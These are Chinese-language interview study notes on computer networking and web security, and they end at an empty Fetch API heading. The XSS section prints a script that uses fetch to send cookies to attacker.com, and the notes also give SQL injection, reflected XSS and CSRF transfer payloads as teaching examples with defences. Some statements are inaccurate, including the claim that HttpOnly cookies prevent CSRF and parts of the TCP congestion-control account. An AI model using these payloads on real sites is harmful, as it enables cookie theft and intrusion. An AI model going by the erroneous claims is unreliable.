# 计算机网络 面试题整理

## 1. 问题：HTTP 请求方式

1. **`GET`** 请求指定资源获取数据，通过 URL 传递参数，请求结果会被缓存，可以被书签保存，不适合传输敏感信息
2. **`POST`** 向指定资源提交数据，将数据放在请求体中发送给服务器，请求结果不会被缓存
3. **`PUT`** 用于更新资源，将数据放在请求体中发给服务器，通常用于更新整个资源
4. **`DELETE`** 用于删除资源，将数据放在请求体中发给服务器，用于删除指定资源
5. **`HEAD`** 只请求资源的头部信息（不返回主体）
6. **`OPTIONS`** 用于获取指定 URL 的支持方法，请求成功会有一个 Allow 的偷包含类似 GET、POST 这样的信息
7. **`TRACE`** 用于跟踪请求-响应的传输路径，服务器会将收到的请求原样返回给客户端，主要用于调试，被用于激发一个远程的，应用层的请求消息回路
8. **`CONNECT`** 用于建立一个到服务器的隧道，通常用于 HTTPS 等加密通信。把请求连接转换到透明的 TCP/IP 通道

## 2. 问题：GET/POST 区别

**区别**：

1. get 幂等，post 不是。（多次访问效果一样为幂等）
2. get 能触发浏览器缓存，post 不能
3. get 能由浏览器自动发起（如 img-src,资源加载），post 不行
4. post 相对安全，一定程度上规避 CSRF 风险
5. get 在浏览器回退时是无害的，而 post 会再次提交请求
6. get 参数在 URL 中可见，post 参数在请求体中不可见
7. get 请求只能进行 url 编码，而 post 支持多种编码方式
8. get 请求在 URL 中传送的参数是有长度限制的，而 post 没有
9. 对参数的数据类型，get 只接受 ASCII 字符，而 post 没有限制

**相同**：

1. 都不安全，都是基于 http，明文传输
2. 参数并没有大小限制，是 URL 大小有限制，因为要保护服务器（chrom 2M IE 2048）

## 3. 问题：RESTful 规范

RESTful 规范是一种基于 REST（Representational State Transfer，表征性状态转移）架构风格的 Web API 设计准则，旨在通过统一接口实现资源的高效管理和访问。其核心在于将网络中的一切视为资源，并通过 HTTP 协议的标准方法（如 GET、POST、PUT、DELETE）对资源进行操作，从而提升 API 的可读性、可扩展性和可维护性。‌‌

核心原则

1. 资源定位：每个资源通过唯一的 URI（统一资源标识符）标识，URI 应使用名词（通常为复数形式）而非动词，例如 /users 表示用户资源集合，而非 /getUsers
2. 统一接口:所有资源的操作都应通过统一的接口进行，包括 HTTP 方法（GET、POST、PUT、DELETE 等）、请求头（如 Content-Type、Accept 等）和请求体（用于 POST、PUT 等方法）。
3. 无状态性：每个请求需包含服务器处理所需的全部信息（如认证 Token），服务器不保存客户端会话状态，从而提升可扩展性和可靠性。‌‌
4. 表述与格式 ‌：资源以表述形式（如 JSON、XML）交互，客户端通过 Accept 头声明期望格式，服务端通过 Content-Type 头返回数据。‌‌

## 4. 问题：浏览器缓存（强缓存/协商缓存）

若缓存失效，强缓存返回 200，协商缓存返回 304 状态码<br/>
https://www.zhihu.com/question/318091919/answer/2376806633?utm_id=0

## 5. 问题：Cache-Control 的取值

`Cache-Control`指令可以单独或组合使用，以定义特定资源的缓存策略。

1. `no-store:` 禁止缓存。表示不应存储请求或响应的任何部分
2. `no-cache:` 协商缓存。表示资源在缓存过期后，必须向服务器发送请求来确认缓存的有效性
3. `max-age=<seconds>:` 缓存时间，单位为秒。表示资源在缓存中的有效期，超过此时间后，缓存将失效。
4. `s-maxage=<seconds>:` 共享缓存最大年龄，单位为秒。与 max-age 类似，但仅适用于共享缓存,代理服务器缓存（如 CDN），而不是私有缓存。
5. `public:` 表示响应可以被任何缓存（包括私有缓存和共享缓存）缓存。
6. `private:` 表示响应只能被私有缓存（如浏览器缓存）缓存，不能被共享缓存（如 CDN 缓存）缓存。
7. `must-revalidate:` 必须重新验证缓存。表示资源在缓存过期后，必须向服务器发送请求来确认缓存的有效性。
8. `proxy-revalidate:` 代理必须重新验证缓存。与 must-revalidate 类似，但适用于代理缓存。
9. `max-stale=<seconds>:` 最大陈旧时间，单位为秒。表示客户端可以使用过期的缓存资源，而无需立即向服务器请求验证。
10. `min-fresh=<seconds>:` 最小新鲜时间，单位为秒。表示客户端希望获取一个在指定时间内不会过期的响应。
11. `immutable:` 表示响应内容不会改变，浏览器可以安全地缓存响应并在后续请求中使用。
12. `no-transform:` 表示响应内容不能被转换（如压缩），以确保缓存的响应与原始服务器响应一致。
13. `only-if-cached:` 仅当缓存存在时才返回响应。表示客户端仅在缓存中存在资源的情况下才发送请求，否则直接返回 504 网关超时错误。

## 6. 问题：常见的 HTTP 状态码以及代表的意义

- 1xx 信息状态码 请求已接受，继续处理
- 200 OK：请求成功，响应体包含请求的数据。
- 201 Created：请求成功，资源已创建，响应体包含新资源的信息。
- 204 No Content：请求成功，响应体为空。
- 301 Moved Permanently：资源已永久移动到新的 URL，响应头 Location 包含新的 URL。
- 302 Found：资源已临时移动到新的 URL，响应头 Location 包含新的 URL。
- 304 Not Modified：资源未修改，客户端可以使用缓存的版本。
- 400 Bad Request：客户端请求语法错误，服务器无法理解。
- 401 Unauthorized：请求需要认证，响应头 WWW-Authenticate 包含认证信息。
- 403 Forbidden：服务器理解请求，但拒绝执行（无权限）。
- 404 Not Found：请求的资源不存在。
- 405 Method Not Allowed：请求方法不被目标资源支持
- 500 Internal Server Error：服务器内部错误，无法完成请求。
- 502 Bad Gateway：网关/代理服务器从上游服务器收到无效响应。
- 503 Service Unavailable：服务器暂时无法处理请求，通常是因为过载或维护。
- 504 Gateway Timeout：网关/代理服务器未能及时从上游服务器获得响应。

## 7. 问题：网络状态 301、302、303 有何区别

- **HTTP 状态码 301**: 永久重定向。表示请求的资源已被永久移动到新的位置，将来任何新的请求都应使用新的 URL。大多数浏览器会缓存这个重定向的 URL，所以下次访问旧的 URL 时，浏览器会直接跳转到新的 URL，而不会再向服务器请求。
- **HTTP 状态码 302**： 临时重定向。表示请求的资源已被临时移动到新的位置，客户端应继续使用旧的 URL 访问资源。与 301 不同，浏览器不会缓存 302 重定向的 URL，每次访问旧的 URL 时，都会向服务器发送请求。
- **HTTP 状态码 303**： 查看其他位置。表示请求的资源存在于另一个 URL，应使用 GET 方法获取。与 302 不同，303 状态码要求客户端使用 GET 方法访问新的 URL，而不是使用原始请求方法，主要用于在执行 POST、PUT 等可能引起服务器状态变化的操作之后，将客户端重定向到一个新的资源，避免用户刷新或重复提交表单。

## 8. 问题：网络状态 400、401、403 和 404 有何区别

**400 Bad Request**

- 状态码说明：表示客户端请求语法错误，服务器无法理解。可能由于请求的参数不正确、格式错误或其他语法问题导致的。
- 常见原因：用户提供的数据格式不正确，请求缺少必需的参数，或请求中包含无效的字符。
- 示例情况：如果客户端发送的 JSON 请求格式不合法，服务器会返回 400 Bad Request 状态码。

**401 Unauthorized**

- 状态码说明：表示请求需要认证，响应头 WWW-Authenticate 包含认证信息，意味着客户端没有足够的权限来访问请求资源，需要提供有效凭证。
- 常见原因：用户未提供有效的认证信息，或提供的认证信息无效。
- 示例情况：如果客户端发送的请求需要 Basic 认证，而用户未提供正确的用户名和密码，服务器会返回 401 Unauthorized 状态码。·

**403 Forbidden**

- 状态码说明：表示服务器理解请求，但拒绝执行（无权限），客户端没有访问请求资源的权限。
- 常见原因：用户提供的认证信息有效，但不具备访问请求资源的权限。
- 示例情况：如果用户尝试访问一个需要管理员权限的资源，而用户没有管理员权限，服务器会返回 403 Forbidden 状态码。

**404 Not Found**

- 状态码说明：表示请求的资源不存在。
- 常见原因：用户请求的 URL 路径与服务器上的资源路径不匹配。
- 示例情况：如果用户请求的 URL 为 /api/user/123，而服务器上不存在该资源，服务器会返回 404 Not Found 状态码。

## 9. 问题：http 和 https 的区别

主要的区别在于安全性和数据传输方式上，HTTPS 比 HTTP 更加安全，适合用于保护网站用户的隐私安全，如银行网站、电子商务网站等。

- **安全性** HTTP 协议传输的数据都是未加密的，明文传输。因此使用 HTTP 协议传输的数据可以被任何抓包工具截取并查看，存在安全风险。而 HTTPS 协议在 HTTP 协议基础上添加了 SSL/TLS 加密层，能够对传输的数据进行加密，防止被截取和查看，提供了更高级别的安全性。
- **数据传输方式** HTTP 协议使用明文传输数据，而 HTTPS 协议使用加密后的传输数据。因此，HTTPS 协议在传输敏感数据（如密码、个人信息等）时更加安全。HTTP 协议的端口号是 80，HTTPS 协议的端口号是 443。
- **网址导航栏显示** 使用 HTTP 协议的网站导航栏显示的是"http://",而 HTTPS 协议是"https://"
- **证书** HTTPS 需要到 CA 申请证书，一般免费的证书较少，需要一些费用
- **网络速度** HTTP 协议比 HTTPS 协议快，因为 HTTPS 协议需要进行加密解密的操作。
- **SEO 优化** 搜索引擎更倾向于把 HTTPS 网站排在更前面的位置，因为 HTTPS 更安全。

## 10. 问题：描述一下 HTTPS 的加密过程

HTTPS 的加密过程主要包括以下几个步骤：

- **客户端发送请求** 客户端（如浏览器）向服务器发送 HTTPS 请求，请求中包含了要访问的 URL、请求方法（如 GET、POST 等）和其他必要的信息。
- **服务器返回证书** 服务器接收到请求后，会返回一个包含公钥的证书给客户端。证书中包含了服务器的身份信息和公钥。
- **客户端验证证书** 客户端会验证服务器返回的证书是否有效。验证过程包括检查证书的签名、有效期、域名是否匹配等。
- **客户端生成会话密钥** 如果证书验证通过，客户端会生成一个随机的会话密钥，用于后续通信的加密。
- **客户端使用公钥加密会话密钥** 客户端会使用服务器返回的公钥，对会话密钥进行加密。加密后的会话密钥只有服务器的私钥才能解密。
- **服务器使用私钥解密会话密钥** 服务器接收到加密后的会话密钥后，会使用自己的私钥进行解密，得到会话密钥。
- **后续通信加密** 客户端和服务器后续的通信数据，都将使用会话密钥进行加密传输，确保数据在传输过程中的安全性。

**整体**

- 建立链接时：公钥 + 私钥 => 非对称加密
- 后续数据传输：会话密钥 => 对称加密
- 为什么安全： 每一步劫持，都只能截取 mastersecret，没法解密，只能透传，转发。有效保护通讯数据。

## 11. 问题：Cookie 为了解决什么问题

**定义**：Cookie 是一种存储在用户浏览器中的小文件，用于存储网站的一些信息。通过 Cookie，服务器可以识别用户并保持会话状态，实现通话保持。用户再次访问网站时，浏览器会将 Cookie 发送给服务器，服务器根据 Cookie 中的信息来识别用户并提供个性化的服务，存储上限为 4KB。

**解决问题**：Cookie 诞生的主要目的是为了解决 HTTP 协议的无状态问题。HTTP 协议是一种无状态的协议，即服务器无法识别不同的用户或跟踪用户的状态。这导致了一些问题，比如无法保持用户的登陆状态，无法跟踪用户的购物车内容等。

## 12. 问题：Cookie 和 Session 的区别

Cookie(HTTP Cookie)和 Session(会话) 都是用于在 web 应用程序中维护状态和用户身份的两种不同机制：

- **存储位置**
  - **cookie** Cookie 是存储在客户端（通常是用户的浏览器）中的一小段文本数据。浏览器会在每次请求中自动发送 Cookie 到服务器，一遍服务器可以识别用户
  - **Session** Session 是存储在服务器端的会话数据。当用户第一次访问服务器时，服务器会创建一个唯一的会话 ID（Session ID），并将该会话 ID 存储在 Cookie 中发送给客户端。后续的请求中，客户端会自动发送包含会话 ID 的 Cookie 给服务器，服务器根据会话 ID 来识别用户并维护会话状态。
- **持久性**
  - **cookie** Cookie 的持久性可以通过设置过期时间来实现。如果不设置过期时间，Cookie 会在浏览器关闭后被删除。如果设置了过期时间，Cookie 会在过期时间后被删除。
  - **Session** Session 的持久性是由服务器端控制的。默认情况下，Session 会在用户关闭浏览器后过期。但是，服务器也可以通过设置 Session 超时时间来延长会话的有效期。
- **安全性**
  - **cookie** Cookie 存储在客户端，容易被窃取和篡改。为了增加安全性，通常会对 Cookie 中的敏感信息进行加密，或者使用 HTTPS 协议传输 Cookie。
  - **Session** Session 存储在服务器端，相对来说更安全。因为会话数据只在服务器端存储，客户端只能获取会话 ID，而无法直接获取会话数据。
- **服务器负担**
  - **cookie** Cookie 的存储在客户端，服务器不需要维护 Cookie 的状态，只需要验证有效性，对服务器的负担较小。
  - **Session** Session 的存储和维护是在服务器端进行的，对服务器的负担较大。因为每个会话都需要在服务器端存储会话数据，并且需要根据会话 ID 来识别用户。
- **跨多个页面**
  - **cookie** Cookie 可以被跨多个页面和不同子域共享，这使得它们适用于用户跟踪和跨多个页面的数据传递。
  - **Session** Session 只能在当前会话内使用，不容易在不同会话之间共享。
- **无需登录状态**
  - **cookie** Cookie 可以在用户未登录的情况下使用，因为 Cookie 是存储在客户端的。
  - **Session** Session 需要用户登录后才能使用，因为 Session 是存储在服务器端的，需要根据会话 ID 来识别用户。

## 13. 问题：TCP（传输控制协议）和 UDP（用户数据协议）的区别

两种常用的传输层协议，用于在网络中传输数据。

**TCP** 是一种面向连接的、可靠的、基于字节流的传输层通信协议。它确保数据在传输过程中不丢失、不重复，并且按照发送顺序进行接收。他通过三次握手建立连接，四次挥手断开连接，确保数据的完整性和顺序性。TCP 使用流控制、拥塞控制和错误检测等机制来确保数据的可靠传输。他适用于需要可靠传输的应用，如文件传输、电子邮件和网页浏览等

**UDP** 是一种无连接的、不可靠的、基于数据报的传输层通信协议。它不保证数据的可靠传输，也不保证数据的顺序接收。它不需要建立连接，直接将数据包发送给目标地址。UDP 没有流控制和拥塞控制，也不确保数据的完整和顺序。UDP 适用于实时性要求高的应用，如音频、视频和实时游戏等。

总结来说，TCP 提供可靠的，面向连接的数据传输，适用于对数据完整性和顺序性要求较高的应用；而 UDP 提供不可靠的，无连接的数据传输，适用于实时性要求较高的应用。根据应用的需求和特点选择 TCP 还是 UDP。

## 14. 问题：TCP 三次握手

- **第一握手(SYN)** 发送方首先向接受方发送一个 SYN（同步）标志的 TCP 包，该包包含一个随机生成的初始化序列号（ISN），这表示发送方希望简历一个连接，并且指定了一个用于数据传输的起始序号。
- **第二握手(SYN-ACK)** 接受方收到 SYN 包后，会回复一个 SYN-ACK（同步-确认）标志的 TCP 包。该包包含接受方的初始化序列号（ISN）和确认号（ACK），确认号的值是发送方的 ISN 加 1。这表示接受方同意建立连接，并且指定了一个用于确认数据接收的序号。
- **第三握手(ACK)** 发送方收到 SYN-ACK 包后，会回复一个 ACK（确认）标志的 TCP 包。该包包含发送方的确认号（ACK），确认号的值是接受方的 ISN 加 1。这表示发送方已经收到了接受方的确认，连接建立成功。

## 15. 问题：如果 TCP 变成二次握手会导致的问题

如果变成二次握手，即客服端发送 SYN 请求后，服务器直接发送 ACK 响应，省略了服务器的 SYN+ACK 响应。
这会导致以下问题：

1. 服务器无法确认客户端是否收到服务器的 SYN+ACK 响应，客户端发送 SYN 请求后可能会关闭连接或丢失数据包
2. 客户端无法得知服务器的初始序列号，无法正确确认服务器的 ACK 响应

因此，将 tcp 三次握手变成两次握手会导致连接建立的不可靠性，可能会出现连接无法建立或数据传输错误的情况。三次握手的设计可以确保双方都能确认对方的状态和序列号，从而建立可靠的连接。

## 16. 问题：TCP 的四次挥手

1. 客户端发送终止请求（FIN）给服务器，通知服务器关闭连接。
2. 服务器收到 FIN 请求后，发送确认响应（ACK）给客户端，确认关闭连接。
3. 服务器发送剩余数据给客户端，并发送终止请求（FIN）给客户端。
4. 客户端确认服务器的终止请求，发送确认响应（ACK）给服务器，确认关闭连接。
5. 连接终止完成。

## 17. 问题：描述一下 TCP 的拥塞控制

网络传输过程中，某段时间如果网络中某一资源的需求超过了该资源所能提供的可用部分，网络性能就会变坏，这种情况就叫做网络拥塞，为了解决这个问题，TCP 中使用了四种拥塞控制算法

1. 慢开始
   - 慢开始算法是 TCP 拥塞控制的一种机制，用于控制发送方在开始发送数据时的初始发送速率。
   - 当发送方开始发送数据时，会将发送窗口的大小设置为一个较小的值，如 1 个 MSS（最大报文大小）。
   - 发送方每收到一个确认报文，就将发送窗口的大小加倍，即每次发送的速率加倍。
   - 这种指数增加的发送速率可以帮助发送方快速适应网络的变化，避免网络拥塞。
   - 然而，由于网络中可能存在其他发送方或接收方，也会占用网络资源，导致发送方的发送速率超过了网络的可用容量。
   - 为了解决这个问题，TCP 引入了拥塞避免算法。
2. 拥塞避免
   - 拥塞避免算法是 TCP 拥塞控制的一种机制，用于控制发送方在慢开始阶段后发送数据的速率。
   - 当发送方的发送窗口大小超过了网络的可用容量，就会触发拥塞避免算法。
   - 拥塞避免算法会根据网络的拥塞情况，动态调整发送窗口的大小，避免发送方的发送速率超过网络的可用容量。
   - 拥塞避免算法通过增加发送窗口的大小，实现了线性增加的发送速率，避免了网络拥塞。
3. 快重传
   - 快重传算法是 TCP 拥塞控制的一种机制，用于在接收方收到重复的确认报文时，立即重传丢失的数据包，而不是等待超时。
   - 当接收方收到重复的确认报文时，会发送一个快重传请求给发送方，通知发送方重传丢失的数据包。
   - 发送方收到快重传请求后，会立即重传丢失的数据包，而不是等待超时。
   - 快重传算法可以减少数据传输的延迟，提高数据传输的效率。
   - 然而，快重传算法也会增加网络的负载，因为它需要在接收方和发送方之间传递快重传请求。
   - 为了解决这个问题，TCP 引入了快恢复算法。
4. 快恢复
   - 快恢复算法是 TCP 拥塞控制的一种机制，用于在接收方收到重复的确认报文后，快速恢复发送窗口的大小。
   - 当接收方收到重复的确认报文时，会发送一个快重传请求给发送方，通知发送方重传丢失的数据包。
   - 发送方收到快重传请求后，会立即重传丢失的数据包，而不是等待超时。
   - 快恢复算法会根据网络的拥塞情况，动态调整发送窗口的大小，避免发送方的发送速率超过网络的可用容量。
   - 快恢复算法通过增加发送窗口的大小，实现了线性增加的发送速率，避免了网络拥塞。

## 18. 问题：什么是跨域？如何解决？

在 web 应用程序中，一个网页的代码试图向不同源（不同的域名、协议、端口）的服务器发送请求，就会触发跨域问题。浏览器的同源策略会限制这种跨域请求，防止恶意网站窃取用户数据。同源策略要求网页只能与同一源的资源进行交互，而不允许与不同源的资源直接交互。

**解决方法**

- Nginx 充当代理服务器，分发请求到目标服务器。
- Nodejs 同域部署页面，搭建 BFF 层，服务对服务请求。
- 服务器端配置 CORS 策略，可以允许指定源（域名、协议、端口）的请求 Access-Control-Allow-Origin。
- Iframe 通讯，通过在主页面嵌入一个隐藏的 iframe，将目标页面加载到 iframe 中，并通过在主页面和 iframe 页面之间使用`postMessage()`方法进行消息传递，从而实现跨域的数据交换。

## 19. 问题：同源策略具体限制的具体内容

- **DOM 访问限制** 不同源的网页不能直接访问彼此的 DOM 元素，包括读取和修改。这意味着一个网页无法通过 Javascript 获取另一个网页的内容，除非目标网页明确授权。
- **XMLHttpRequest 限制** XMLHttpRequest(XHR)是用于在网页和服务器之间进行异步数据交换的技术。同源策略禁止不同源的网页通过 XHR 请求发送或接受数据。
- **Cookie 限制** 不同源的网页不能访问彼此的 Cookie。Cookie 是用于在客户端存储和传输信息的机制，同源策略确保 Cookie 只能由创建它的源访问。
- **跨文档消息限制** 同源策略限制不同源的窗口或帧之间通过`postMessage()`方法进行通信。可以防止恶意网页连用通信渠道。
- **脚本限制** 不同源的脚本文件（如 JavaScript）不能相互引用和执行

## 20. 问题：发送请求时浏览器做了什么

- **发送请求头**：浏览器向目标服务器发送一个请求，其中包含了请求方法（GET、POST 等）、请求 URL、请求头信息（如 User-Agent、Accept 等）以及请求体（如果有）。检查同源策略，浏览器会检查目标 URL 是否符合同源策略。它会比较目标 URL 的协议、主机和端口号与当前网页的协议、主机和端口号是否一致，如果不一致，就会触发跨域请求。
- **发送跨域请求**：如果目标 URL 与当前页面不同源，浏览器会发送一个跨域请求。跨域请求通常是一个 HTTP OPTIONS 预检请求，用于检查服务器是否支持跨域请求。浏览器会在发送实际请求之前，先发送一个预检请求，以确保服务器允许跨域请求。
- **服务器处理预检请求**：目标服务器接收到预检请求后，会进行一系列的处理。它会检查请求中的一些特定头部信息，如`Origin`和`Access-Control-Request-Method`，来检验是否允许跨域请求。
- **发送响应头**：如果服务器允许跨域请求，它会在响应中添加一些特定的头部信息，如`Access-Control-Allow-Origin`、`Access-Control-Allow-Methods`、`Access-Control-Allow-Headers`等。这些头部信息告诉浏览器是否允许当前网页访问服务器返回的数据。
- **检查响应头**：浏览器接收到服务器的响应后，会检查响应头中的`Access-Control-Allow-Origin`字段。判断是否允许当前页面进行跨域请求。如果该字段的值与当前网页的源不一致，或者没有该字段，浏览器会拒绝访问服务器返回的数据。
- **处理响应数据**：如果浏览器允许跨域请求，它会将服务器返回的数据传递给当前网页的 Javascript 代码进行处理。Javascript 代码可以根据需要操作这些数据，如更新网页内容、触发事件等。

## 21. 问题：XSS 攻击是什么

攻击者通过**注入恶意脚本代码**来利用应用程序的漏洞，从而在用户的浏览器中执行恶意操作。<br/>
XSS 估计通常分为三种类型：存储型（Stored）,反射型（Reflected）,基于 DOM 的（DOM-based）。

**存储型（Stored）**：
攻击者将恶意代码上传到目标网站的服务器上，通常是在用户评论，留言板或用户生成的内容中。当其他用户访问包含恶意代码的页面的时候，他们的浏览器会执行这些代码。

**案例**：攻击者在一个论坛网站上发布了一个包含恶意脚本的评论。其他用户访问这个评论的时候，恶意脚本会被执行，窃取他们的会话 cookie 并发送到攻击者的服务器上。

```js
<script>
  fetch("http://attacker.com/steal-cookie.php?cookie=" + document.cookie)
</script>
```

**反射型（Reflected）**：攻击者将恶意脚本代码作为参数发送到目标应用程序的 URL 中,然后诱使用户点击该 URL。当正常用户点击包含恶意脚本的链接时，恶意脚本会被从 URL 中提取并执行。

```
http://example.com/comment?message=<script>alert("XSS");</script>
```

**基于 DOM 的（DOM-based）**：攻击者利用应用程序的 DOM（文档对象模型）漏洞，将恶意脚本代码注入到网页中。当正常用户与包含恶意脚本的网页交互时，恶意脚本会被执行。

1. 用户输入

```html
<img src="x" onerror="alter('XSS')" />
```

2. 显示在页面上的内容

```html
<div class="post-content">
  <p>这是一个包含恶意脚本的段落。</p>
  <img src="x" onerror="alter('XSS')" />
</div>
```

- **防范措施**
  - **输入验证和过滤**：对用户输入的数据进行验证和过滤，确保只接受预期的格式和类型。避免直接将用户输入插入到 HTML、CSS 或 JavaScript 中。
  - **转义输出**：在将用户输入插入到 HTML、CSS 或 JavaScript 中之前，对特殊字符进行转义。例如，将`<`转义为`&lt;`，将`>`转义为`&gt;`，将`&`转义为`&amp;`等。防止浏览器解释用户输入的内容为可执行代码。
  - **使用安全的编程框架和库**：使用经过验证和安全的编程框架和库，如 React、Angular、Vue 等。这些框架和库通常会提供内置的安全机制，帮助开发人员避免常见的安全漏洞。
  - **设置 HTTP 头部**：使用 Content Security Policy(CSP)等 HTTP 头部来限制哪些资源可以加载和执行。CSP 可以帮助阻止不受信任的脚本和内容加载。
  - **最小化权限**：确保应用程序在运行时具有最小的权限。避免在 JavaScript 中使用特权模式，并限制对敏感操作和数据的访问。
  - **教育和培训**：开发团队需要受过培训，了解 XSS 攻击的工作原理以及如何预防它们。员工的安全意识教育也非常重要。
  - **安全漏洞扫描和审计**：定期对应用程序进行安全漏洞扫描和代码审计，以及时发现并修复潜在的 XSS 漏洞。
  - **更新和维护依赖项**：确保应用程序使用的所有框架，库和插件都是最新版本，并及时应用安全更新。

## 22. 问题：SQL 注入

SQL 注入攻击 假设有一个网页上的登录表单，该表单将用户提供的用户名和密码与数据库中的数据进行比较以进行身份验证。通常，身份验证的 SQL 查询可能如下所示：

```sql
SELECT * FROM users WHERE username = '输入的用户名' AND password = '输入的密码'
--
输入：' OR '1'='1
--
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '输入的密码'
```

在这种情况下，由于`'1'='1'`始终为真，所以无论用户输入的用户名和密码是什么，SQL 查询都会返回所有用户的记录。这就导致了身份验证的失败，攻击者可以使用任意的用户名和密码登录到系统中。

## 23. 问题：DDoS 攻击

DDoS 攻击（Distributed Denial of Service Attack）是一种通过向目标服务器发送大量的请求来使其过载或崩溃的攻击。攻击者通常会使用多台计算机（称为“僵尸网络”）来发送请求，从而实现对目标服务器的攻击，使其无法正常响应合法用户的请求。

**DDoS 攻击可以采用不同的形式**：

1.  SYN/ACK Flood 攻击：攻击者发送大量伪造的 TCP 连接请求（SYN），但不会完成 TCP 握手过程，这回占用服务器的资源，使其无法处理合法请求。
2.  UDP Flood 攻击：攻击者发送大量的 UDP 包到目标服务器，以耗尽服务器的处理能力。UDP Flood 攻击通常更难检测，因为 UDP 是面向无连接的协议。
3.  ICMP Flood 攻击：攻击者发送大量的 ICMP 回显请求（ping 请求）到目标服务器，以超载目标服务器，这种攻击通常被称为 Ping 洪泛攻击。
4.  HTTP Flood 攻击：攻击者发送大量的 HTTP 请求到目标服务器，以消耗服务器的资源和带宽，这种情况通常针对 Web 应用程序。
5.  DNS Amplification：攻击者向未经授权的开放 DNS 服务器发送 DNS 查询请求，将大量响应引导到目标服务器，使其超载。

DDoS 攻击的目的可以是多种多样的，包括恶意破坏、勒索尝试、竞争对手恶意竟争、政治动机等。<br/>
为了应对 DDoS 攻击，组织和网络管理员通常会采取防御策略，如使用防火墙，入侵检测系统（IDS）和内容分发网络（CDN），以帮助过滤和减轻攻击流量。此外，云服务商通常提供 DDoS 保护服务，帮助客户缓解 DDoS 攻击

## 24. 问题：CSRF 攻击

CSRF 攻击（Cross-Site Request Forgery）是一种利用用户已登录的身份执行非本意操作的攻击。攻击者通常会在受害者不知情的情况下，通过在受害者浏览器中加载恶意页面或点击恶意链接，来执行对目标网站的恶意请求。
这可能包括更改密码，修改电子邮件地址，进行资金转账等，具体取决于受攻击的应用程序的功能

一个简易的 CSRF 攻击示例

1. 用户登录到银行网站并保持会话处于活动状态，它们在浏览网页时访问了一个恶意网站。
2. 恶意网站商包含一下 HTML 代码

```html
<img
  src="http://example.com/transfer?to=attacker&amount=1000000"
  alt="Transfer Money"
/>
```

3. 这个图片的 URL 看似是一个图片，但实际商是向银行网站发出一个转账请求。
4. 用户的浏览器会自动加载这个图片，由于用户仍然在银行网站上保持登录状态，浏览器会发送带有用户凭证的请求到银行网站，从而执行了转账操作。

**防范措施**

1.  **验证请求来源**：在服务器端验证请求的来源是否可信。可以检查请求的 Referer 头或 Origin 头，确保请求来自于预期的域名。
2.  **使用 CSRF 令牌**：在每个表单中包含一个 CSRF 令牌，该令牌是随机生成的唯一值。服务器在处理表单提交时，会验证令牌的有效性，确保请求是由用户自愿发起的，而不是攻击者伪造的。
3.  **不要使用 GET 请求进行敏感操作**：只允许使用安全的 HTTP 方法（如 POST、PUT、DELETE 等）来执行敏感操作。避免使用 GET 方法来执行修改操作，因为 GET 方法的参数会暴露在 URL 中，容易被截获。
4.  **实现同源策略**：同源策略是浏览器的一种安全机制，它限制了从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。通过实现同源策略，可以防止跨站请求伪造攻击。
5.  **使用 HTTP Only Cookie**：将敏感的 Cookie 标记为 HTTP Only，这样浏览器就不会将其包含在跨站请求中。这可以有效防止 CSRF 攻击，因为攻击者无法通过 JavaScript 访问到这些 Cookie。

## 25. 问题：Ajax 的定义及优缺点

Ajax(Asynchronous JavaScript and XML) 是一种用于在后台与服务器进行异步通信的技术。它使用 JavaScript 和 XML（现在通常使用 JSON）来传输数据，而无需刷新整个页面。

**优点**

1.  **异步通信**：Ajax 允许在不刷新整个页面的情况下，与服务器进行异步通信。这意味着用户可以在不中断当前操作的情况下，与服务器进行交互。
2.  **减少带宽使用**：由于只更新部分页面内容，而不是整个页面，因此可以减少对服务器和网络带宽的需求
3.  **提高页面加载速度**：通过异步加载数据，可以提高页面加载速度，减少用户等待时间。
4.  **支持多种数据格式**：Ajax 不仅支持 XML，还支持 JSON 等多种数据格式，使数据的传输更加灵活和高效。

**缺点**

1.  **对搜索引擎不友好**：搜索引擎难获取到完整的页面内容，影响页面的搜索引擎优化（SEO）
2.  **安全问题**：由于 Ajax 是在客户端执行的，因此可能会存在安全问题。例如，跨站脚本攻击（XSS）和跨站请求伪造攻击（CSRF）。
3.  **不支持跨域请求**：由于浏览器的同源策略，Ajax 默认只能向同源的服务器发送请求。如果需要向不同源的服务器发送请求，就需要使用跨域资源共享（CORS）等技术。

## 26. 问题：XMLHttpRequest 对象用法

XMLHttpRequest 对象是用于在后台与服务器进行异步通信的核心对象之一。

```javascript
// 创建一个XMLHttpRequest对象
const xhr = new XMLHttpRequest();

// 注册回调函数，当请求完成时调用
xhr.onload = function () {
  if (xhr.status === 200) {
    // 请求成功，处理响应数据
    const response = JSON.parse(xhr.responseText);
    console.log(response);
  } else {
    // 请求失败，处理错误
    console.error("请求失败，状态码：" + xhr.status);
  }
};

// 配置请求
xhr.open("GET", "https://api.example.com/data", true);

// 设置请求头（如果需要）
xhr.setRequestHeader("Content-Type", "application/json");

// 发送请求
xhr.send();
```

在上面的代码中，首先创建一个 XMLHttpRequest 对象，然后注册一个`onload()`回调函数，在请求完成时调用。在回调函数中，可以根据请求的状态码判断请求是否成功，并处理返回的数据或错误信息。最后，使用`open`方法设置请求的类型（GET,POST）、URL 和异步标志，使用`send`方法发送请求。

**一些常见的方法和属性**

- `open(method, url, async)`：配置请求的方法（GET,POST 等）、URL 和异步标志。
- `setRequestHeader(header, value)`：设置请求头，例如`Content-Type`。
- `send(data)`：发送请求。如果是 POST 请求，需要传递请求体数据。
- `abort()`：取消当前请求。
- `getResponseHeader(header)`：获取指定名称的响应头信息。
- `getAllResponseHeaders()`：获取所有响应头信息。
- `status`：获取响应的状态码（如 200、404 等）。
- `statusText`:获取请求的状态文本。
- `responseText`：获取响应的文本内容。
- `responseXML`：获取响应的 XML 文档对象。

**注意**：XMLHttpRequest 对象的使用方式可能因浏览器而异，某些浏览器可能不支持某些方法或属性。因此，在使用 XMLHttpRequest 对象时，需要注意浏览器的兼容性问题，并根据具体需求选择合适的方法和属性。

## 27. 问题：封装一个 ajax 请求方法

```javascript
function ajaxRequest(url, method, data, callback) {
  const xhr = new XMLHttpRequest();

  xhr.open(method, url, true);
  xhr.onload = function () {
    if (xhr.status === 200) {
      // 请求成功，处理响应数据
      const response = JSON.parse(xhr.responseText);
      callback(null, response);
    } else {
      callback("请求失败，状态码：" + xhr.status, null);
    }
  };
  xhr.onerror = function () {
    callback("请求错误", null);
  };
  xhr.send(data);
}
```

**注意**:Axios 的本质也是对 XMLHttpRequest 的封装，只是它提供了更方便的 API 和更多的功能。

## 28. 问题：Fetch API

